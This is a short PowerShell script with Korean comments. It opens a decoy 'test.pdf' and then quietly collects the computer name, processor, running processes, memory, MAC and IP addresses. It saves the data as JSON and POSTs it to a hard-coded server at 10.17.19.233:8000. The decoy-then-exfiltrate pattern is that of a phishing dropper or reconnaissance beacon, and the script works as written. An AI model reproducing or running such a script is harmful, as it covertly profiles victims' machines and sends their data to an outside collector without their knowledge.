# PDF 파일 실행
Start-Process -FilePath "$PWD\test.pdf"

function Get-SystemInfo {
    $computerInfo = Get-ComputerInfo
    $processes = Get-Process | Select-Object Name, Id
    $networkInfo = Get-NetAdapter

    # 로컬 IP 주소 가져오기
    try {
        $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -ne "Loopback Pseudo-Interface 1" }).IPAddress
    } catch {
        Write-Host "Failed to retrieve IP address."
        $ipAddress = "Unavailable"
    }

    $data = @{
        ComputerName = $computerInfo.CsName
        Processor = $computerInfo.CsProcessors.Name
        User = "superuser"  # 호스트 이름 대신 사용자명을 직접 설정
        Processes = $processes
        Memory = $computerInfo.OsTotalVisibleMemorySize
        MacAddress = $networkInfo.MacAddress
        IPAddress = $ipAddress
    }

    return $data
}

$systemInfo = Get-SystemInfo
$jsonData = $systemInfo | ConvertTo-Json -Depth 3

# JSON 데이터 출력
Write-Host "Generated JSON data:"
Write-Host $jsonData

# 파일명에 사용할 IP 주소 가져오기
$ipAddress = $systemInfo.IPAddress -replace "[^a-zA-Z0-9]", "_" # 파일명에 사용할 수 없는 문자를 '_'로 대체

# 현재 시간 가져오기
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"

# 파일명 생성
$fileName = "superuser`_$ipAddress`_$timestamp.json"

# JSON 데이터 파일로 저장 (디버깅용)
$jsonData | Out-File -FilePath "$PWD\$fileName" -Encoding utf8

# JSON 데이터를 UTF8 형식으로 인코딩하여 서버로 전송
try {
    $response = Invoke-RestMethod -Uri "http://10.17.19.233:8000/data" -Method Post -Body $jsonData -ContentType "application/json"
    Write-Host "Response from server:"
    Write-Host $response
    Write-Host "Data sent successfully to the server."
} catch {
    Write-Host "Failed to send data to server."
    Write-Host "Error message: $_"
}
